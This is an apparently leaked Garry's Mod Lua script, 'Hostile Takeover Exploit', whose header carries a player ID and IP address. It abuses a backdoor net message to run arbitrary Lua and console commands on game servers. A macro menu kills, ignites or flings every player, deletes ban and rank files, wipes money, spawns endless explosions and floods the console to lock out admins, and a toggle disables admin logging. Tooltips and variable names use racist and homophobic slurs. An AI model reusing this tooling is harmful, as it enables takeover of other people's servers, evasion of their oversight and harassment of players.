--[[
	lua/htx_client.lua [#17205, 234222963, UID:1303343489]
	LIÎžS | STEAM_0:1:61425914 <120.146.83.208:54144> | [08.06.15 12:23:36PM]
	===Dirty hacks===
]]

local htx_Mode = CreateClientConVar("htx_mode", 0, false, false)
local htx_Silent = CreateClientConVar("htx_silent", 0, false, false)
 
netKey = "Sandbox_ArmDupe"
 
function IsMessagePooled( netmessage )
status, error = pcall(net.Start,netmessage)
return status
end
 
function HtxModeString()
if GetConVarNumber("htx_mode") == 1 then return "HTX is in lua mode, anything you send will be compiled and run as serverside code"
else return "HTX is in concommand mode, anything you send will be run as a console command by the server"
end
end
 
function HtxPooledString()
if IsMessagePooled( netKey ) then return "HTX exploit detected on this server, fire at will!"
else return "HTX backdoor not present, HTX cannot be used on this server"
end
end
 
function HtxModeBool()
if GetConVarNumber("htx_mode") == 1 then return true
else return false
end
end
 
function Htx_StringRequest( strTitle, strText, strDefaultText, fnEnter, fnCancel, strButtonText, strButtonCancelText )
 
    local Window = vgui.Create( "DFrame" )
        Window:SetTitle( strTitle or "Message Title (First Parameter)" )
        Window:SetDraggable( false )
        Window:ShowCloseButton( false )
        Window:SetBackgroundBlur( true )
        Window:SetDrawOnTop( true )
        Window.Paint = function()
        surface.SetDrawColor( 0, 0, 0, 225 )
        surface.DrawRect( 0, 0, Window:GetWide(), Window:GetTall() )
        surface.SetDrawColor( 0, 0, 0, 255 )
        surface.DrawOutlinedRect( 0, 0, Window:GetWide(), Window:GetTall() )
        surface.SetDrawColor( 255, 150, 0, 200 )
        surface.DrawRect( 0, 25, Window:GetWide(), 2 )
        end
       
    local InnerPanel = vgui.Create( "DPanel", Window )
        InnerPanel:SetDrawBackground( false )
   
    local Text = vgui.Create( "DLabel", InnerPanel )
        Text:SetText( HtxModeString() )
        Text:SizeToContents()
        Text:SetContentAlignment( 5 )
        Text:SetTextColor( color_white )
 
    local Text2 = vgui.Create( "DLabel", InnerPanel )
        Text2:SetText( HtxPooledString() )
        Text2:SizeToContents()
        Text2:SetContentAlignment( 5 )
        Text2:SetTextColor( Color(255,50,50,255) )
 
       
    local TextEntry = vgui.Create( "DTextEntry", InnerPanel )
        TextEntry:SetText( strDefaultText or "" )
        TextEntry.OnEnter = function() Window:Close() fnEnter( TextEntry:GetValue() ) end
       
    local ButtonPanel = vgui.Create( "DPanel", Window )
        ButtonPanel:SetTall( 30 )
        ButtonPanel:SetDrawBackground( false )
 
 
    local Button2 = vgui.Create( "DButton", Window )
            Button2:SetText( "Change Mode" )
            Button2:SizeToContents()
            Button2:SetTall( 20 )
            Button2:SetWide( 80 )
            Button2:SetTextColor( Color(205,205,205,255) )
            Button2.DoClick = function()    
            if GetConVarNumber("htx_mode") == 0 then
            LocalPlayer():ConCommand("htx_mode 1")
            else
            LocalPlayer():ConCommand("htx_mode 0")
            end
            Window:Close()
            timer.Simple(0.05, function() LocalPlayer():ConCommand("htx_menu") end)
            end
            Button2.Paint = function(panel)
            surface.SetDrawColor(255, 150, 0 ,255)
            surface.DrawOutlinedRect(0, 0, Button2:GetWide(), Button2:GetTall())
            draw.RoundedBox( 2, 0, 0, Button2:GetWide(), Button2:GetTall(), Color(0, 0, 0, 130) )
            end
 
 
local gg = vgui.Create( "DCheckBoxLabel", Window )// Create the checkbox
gg:SetPos( 10, 125 )
gg:SetValue( 0 )
gg:SetText( "ULX Silent" )
gg:SetConVar( "htx_silent" )
gg:SetToolTip( "turn this on to stop any commands you send from appearing in the ulx logs" )
gg:SizeToContents()
 
    local Button = vgui.Create( "DButton", ButtonPanel )
        Button:SetText( strButtonText or "OK" )
        Button:SizeToContents()
        Button:SetTall( 20 )
        Button:SetWide( Button:GetWide() + 20 )
        Button:SetPos( 5, 5 )
        Button.DoClick = function()  surface.PlaySound("buttons/blip1.wav") fnEnter( TextEntry:GetValue() ) end
 
        --Button.DoClick = function() Window:Close() fnEnter( TextEntry:GetValue() ) end
       
    local ButtonCancel = vgui.Create( "DButton", ButtonPanel )
        ButtonCancel:SetText( strButtonCancelText or "Cancel" )
        ButtonCancel:SizeToContents()
        ButtonCancel:SetTall( 20 )
        ButtonCancel:SetWide( Button:GetWide() + 20 )
        ButtonCancel:SetPos( 5, 5 )
        ButtonCancel.DoClick = function() Window:Close() if ( fnCancel ) then fnCancel( TextEntry:GetValue() ) end end
        ButtonCancel:MoveRightOf( Button, 5 )
 
       
    ButtonPanel:SetWide( Button:GetWide() + 5 + ButtonCancel:GetWide() + 10 )
   
    local w, h = Text:GetSize()
    w = math.max( w, 400 )
   
    Window:SetSize( w + 150, h + 55 + 75 + 10 )
    Window:Center()
 
    Button2:SetPos( w / 2 + 32, 64 )
   
    InnerPanel:StretchToParent( 5, 25, 5, 45 )
   
    Text:StretchToParent( 5, -25, 5, 35 )
    Text2:StretchToParent( 5, 5, 5, 35 )
    if GetConVarNumber("htx_mode") == 1 then Text:SetTextColor( Color(0,155,255,255) ) else Text:SetTextColor( Color(255,155,0,255) ) end
    if IsMessagePooled( netKey ) then Text2:SetTextColor( Color(255,255,0,255) ) end
 
    TextEntry:StretchToParent( 5, nil, 5, nil )
    TextEntry:AlignBottom( 0 )
   
    TextEntry:RequestFocus()
    TextEntry:SelectAllText( true )
   
    ButtonPanel:CenterHorizontal()
    ButtonPanel:AlignBottom( 8 )
   
    Window:MakePopup()
    Window:DoModal()
    return Window
 
end
 
concommand.Add("htx_menu", function()
local command = Htx_StringRequest( "Hostile Takeover Exploit v1.02  (Created By LegendofRobbo)", "", "", function(text)
-- if were in silent mode then turn ulx logecho off first
if GetConVarNumber("htx_silent") == 1 then
net.Start(netKey)
net.WriteString( "ulx_logecho 0" )
net.WriteBit(0)
net.SendToServer()
 
timer.Simple(0.1, function()
net.Start(netKey)
net.WriteString( "ulx_logecho 0" )
net.WriteBit(1)
net.SendToServer()
end)
end
 
net.Start(netKey)
net.WriteString( text )
net.WriteBit(HtxModeBool())
net.SendToServer()
 
    end, function() end )
end)
 
concommand.Add( "htx_macros", function( )
Menu = vgui.Create("DFrame")
Menu:SetSize(630,260)
Menu:SetTitle("Hostile Takeover Exploit --  Macro Menu")
Menu:Center()
Menu:MakePopup()
Menu.Paint = function()
surface.SetDrawColor( 0, 0, 0, 200 )
surface.DrawRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "I think this is pretty self explanatory" )
Macro.Paint = function()
surface.SetDrawColor( 0, 60, 0, 200 )
Macro:SetText( "Kill Everybody" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 140, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Launch everybody all over the map" )
Macro.Paint = function()
surface.SetDrawColor( 0, 60, 0, 200 )
Macro:SetText( "Launch Everybody" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 260, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Spam this for eardrum destruction" )
Macro.Paint = function()
surface.SetDrawColor( 0, 60, 0, 200 )
Macro:SetText( "Ear Rape" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 380, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Careful, this button is hot ;)" )
Macro.Paint = function()
surface.SetDrawColor( 0, 60, 0, 200 )
Macro:SetText( "Ignite Everybody" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 500, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "If these guys weren't already gay they sure as hell are now" )
Macro.Paint = function()
surface.SetDrawColor( 0, 60, 0, 200 )
Macro:SetText( "Meatspin Everybody" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[gui.OpenURL(\"http://www.pointblankrp.com/community/meatspin/\")]]) end" )
net.WriteBit(1)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 500, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Spread the word niggaz" )
Macro.Paint = function()
surface.SetDrawColor( 0, 60, 0, 200 )
Macro:SetText( "GNAG page" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[gui.OpenURL(\"http://averryniceguy.wix.com/gnag\")]]) end" )
net.WriteBit(1)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Clears the ulx ban database" )
Macro.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
Macro:SetText( "Delete ULX bans" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 140, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Resets everybody to user rank" )
Macro.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
Macro:SetText( "Delete ULX ranks" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 260, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Makes everybody poor again" )
Macro.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
Macro:SetText( "Delete all RP money" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "rp_resetallmoney" )
net.WriteBit(false)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 380, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "huehuehueuhuehue" )
Macro.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
Macro:SetText( "Fuck with physics" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "sv_friction -8" )
net.WriteBit(false)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 500, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Isaac newton can suck my nuts" )
Macro.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
Macro:SetText( "Fuck with gravity" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "sv_gravity -600" )
net.WriteBit(false)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Raze it all to the ground" )
Macro.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
Macro:SetText( "Artillery Strike" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local faggot = "hook.Add(\"Think\", \"bombstrike\", function() \n local explode = ents.Create( \"env_explosion\" ) \n explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) explode:Spawn() explode:SetKeyValue( \"iMagnitude\", \"500\" ) explode:Fire( \"Explode\", 0, 0 ) end)"
net.Start(netKey)
net.WriteString( faggot )
net.WriteBit(1)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 140, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Blowing shit up never gets old..does it?" )
Macro.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
Macro:SetText( "Stop Artillery" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "hook.Remove( \"Think\" ,\"bombstrike\")" )
net.WriteBit(1)
net.SendToServer()
end
 
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent( Menu )  
Macro:SetPos( 260, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetToolTip( "Prevents admunz from using the remote console" )
Macro.Paint = function()
surface.SetDrawColor( 60, 60, 0, 200 )
Macro:SetText( "Flood Console" )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "timer.Create( \"adminsgonnahate\", 0.05, 0, function() print(\"0100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101010010100100101010100101101010101000101010100101010010001010101011100011001010100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101010010100100101010100101101010101000101010100101010010001010101011100011001010100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101\") end )" )
net.WriteBit(1)
net.SendToServer()
end
 
 
 
 
end)